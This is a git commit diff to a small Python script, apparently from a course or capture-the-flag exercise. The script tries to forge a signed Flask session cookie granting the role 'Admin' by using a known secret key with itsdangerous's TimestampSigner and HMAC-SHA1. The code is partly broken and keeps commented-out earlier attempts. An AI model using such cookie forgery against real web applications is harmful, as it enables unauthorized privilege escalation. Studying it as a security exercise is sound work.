2cdd486787b0ba1442d552232737f2937659c824
Jacky <gokurohono@gmail.com>
2021-06-19 21:23:07 +1000

    a

--- week2/scripts/flask.py
+++ week2/scripts/flask.py
@@ -1,11 +1,31 @@
-from itsdangerous import TimestampSigner
+from flask.sessions import TaggedJSONSerializer
+from itsdangerous import TimestampSigner, URLSafeTimedSerializer
+import hashlib
 import base64
 
-secret_key='$hallICompareTHEE2aSummersday'
-data='{"role": "Admin","username": "jack"}'
+secret='$hallICompareTHEE2aSummersday'
+data={"role":"Admin","username":"jack"}
 
-encoded = base64.b64encode(data.encode())
-s = TimestampSigner('secret_key')
-result = s.sign(encoded)
-print(result.decode())
+
+#encoded = base64.b64encode(data.encode()).decode()
+
+#s = TimestampSigner(secret)
+#result = s.sign(data)
+#print(result)
+#data = result.decode().split('.')[1:]
+#data.insert(0, encoded)
+#print('.'.join(data))
+
+serializer = URLSafeTimedSerializer(
+    secret_key=secret,
+    signer=TimestampSigner,
+    signer_kwargs={
+        'key_derivation':'hmac',
+        'digest_method': hashlib.sha1
+    }
+).load(data)
+
+print(serializer)
+
+
 
